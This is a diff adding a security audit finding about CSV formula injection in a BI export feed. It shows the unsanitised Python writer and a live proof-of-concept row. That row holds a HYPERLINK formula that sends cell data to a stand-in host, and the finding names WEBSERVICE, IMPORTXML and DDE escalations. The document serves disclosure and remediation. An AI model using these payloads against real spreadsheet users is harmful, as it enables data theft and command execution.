@@ -1238,3 +1238,98 @@ Three to act on first, for different reasons:
   duplicate count is still zero.
 - **R2-711** — the reason R2-701 could be closed as fixed without anyone noticing. Cheap, and it
   closes the whole class rather than the seven instances.
+
+---
+
+# Round 3 findings (R2-743 onward)
+
+Round 3 is the pass over the 370 closed register rows that were never opened individually.
+Protocol unchanged: E0 schema / E1 code read / E2 gate / E3 live, E1 never skipped, and every
+finding read **as filed** rather than from its register note.
+
+| id | severity | one-line | surfaced while |
+|---|---|---|---|
+| **R2-743** | **CRITICAL** | **the BI CSV feed is formula-injectable — the fourth call site R2-185 named, never fixed, and R2-407 was closed claiming it was the last one** | worklist row 4 (R2-407) |
+
+## FINDING R2-743 — 🔴 CRITICAL: the BI export feed writes user-controlled text straight into CSV cells, so the one export built for external consumption is the one still formula-injectable
+
+**This is R2-185's fourth call site.** R2-185 as filed reads *"Fix: prefix any value starting with
+`= + - @ \t \r` with a single quote, or quote-and-escape via a shared writer helper. **One helper,
+four call sites.**"* and enumerates them:
+
+| Export named by R2-185 | Fixed? | Commit |
+|---|---|---|
+| `labour.py` BOCW | ✅ | `b3d3a77` |
+| `dpr.py` Daily Progress | ✅ | `beb5823` (as R2-266) |
+| `hr.py` payroll/attendance | ✅ | `74b64ce` (as R2-407) |
+| **`bi_export.py:85` BI feed — "every column, via `csv.DictWriter`"** | ❌ **never** | — |
+
+R2-185 was closed on the BOCW site alone. R2-407 was then closed with the note *"payslip CSV
+neutralizes formula cells (**last raw-text exporter**)"* — that parenthetical is false, and it is
+what stopped anyone looking further.
+
+### The code
+`_to_csv` (`backend/app/routers/bi_export.py:86-92`) is the only CSV path in the file and applies no
+neutralization whatsoever:
+
+```python
+def _to_csv(rows: List[dict], columns: List[str]) -> str:
+    buf = io.StringIO()
+    writer = csv.DictWriter(buf, fieldnames=columns, extrasaction="ignore")
+    writer.writeheader()
+    for r in rows:
+        writer.writerow(r)
+    return buf.getvalue()
+```
+
+A whole-file grep for `lstrip` / `startswith` / `escape` / `sanit` / quote-prefixing returns nothing
+relevant. All three feed routes render through it: `feed_projects` (:236), `feed_budget_variance`
+(:327), `feed_labour_productivity` (:365). The other three exporters each carry a local
+`_csv_safe_cell`; `bi_export.py` has zero references to one.
+
+### Proved live, 2026-08-28, in ZZ R8 Throwaway
+A project was created whose `name`, `code` and `city` are spreadsheet formulas, and the feed was
+pulled with a real BI API key. The response body, verbatim:
+
+```
+project_id,name,code,status,city,state,category,stage,health,project_value,planned_start_date,planned_end_date
+fb4ec3cd-1172-4b4f-a11d-ae4f51ea7412,"=HYPERLINK(""https://zz.example/?d=""&A1,""ZZ CLICK"")",@ZZ-CODE,Ongoing,+ZZCITY,Maharashtra,,,Good,0.0,,
+```
+
+Three injectable cells in a single row:
+- `name` — quote-doubled by `csv.DictWriter`, but the leading `=` survives intact. This is the exact
+  signature R2-407 reproduced and called fixed.
+- `code` — `@ZZ-CODE`, bare and unquoted.
+- `city` — `+ZZCITY`, bare and unquoted.
+
+`&A1` concatenates the neighbouring cell into the request URL, which is the standard exfiltration
+primitive; swapping `HYPERLINK` for `WEBSERVICE` / `IMPORTXML`, or a `cmd|` DDE string, escalates it
+to silent data theft or command execution on the opener's machine.
+
+**Cleanup:** the test project was deleted (`{"success":true,"deleted_dependents":0}`) and both BI
+keys revoked — confirmed `revoked: true` on both, and the raw key now returns 401 against the feed.
+
+### Why CRITICAL rather than HIGH, unlike its parent
+R2-185 was filed HIGH across four in-app exports. This site is worse than its siblings on three
+counts, which is why it is filed at the parent's escalated severity rather than its original:
+
+1. **It is the export designed to be opened by a machine that is not SiteFlow.** The BI feed exists
+   solely to be pulled into Excel, Power BI, Sheets or a warehouse. Every other exporter produces a
+   file a human might glance at first; this one is wired straight into the tool that evaluates the
+   formula.
+2. **It is polled, not clicked.** A BI key is long-lived and typically set up once on a schedule, so
+   a payload lands on every refresh, silently, with no user in the loop to notice.
+3. **`name`, `code`, `city`, `state` and `category` are all free text on project creation** — the
+   fields a site engineer fills in — and all five ship in `feed_projects`.
+
+### Fix
+Reuse the existing helper rather than writing a fourth copy. The three local `_csv_safe_cell`
+definitions (`dpr.py:24`, `hr.py:946`, `labour.py:35`) are already duplicates of each other; lift one
+into a shared module and route all four exporters through it, `bi_export.py` included, so this class
+cannot reopen a fifth time. Apply it inside `_to_csv` so every present and future feed route inherits
+it — per-call-site application is what allowed this site to be missed.
+
+### Gate this needs
+A test asserting that **every** backend CSV producer neutralizes a leading `= + - @` cell, discovered
+by enumeration rather than by a hardcoded list of four filenames. The existing per-finding gates all
+pin their own file, which is precisely why three passed while the fourth was unprotected.
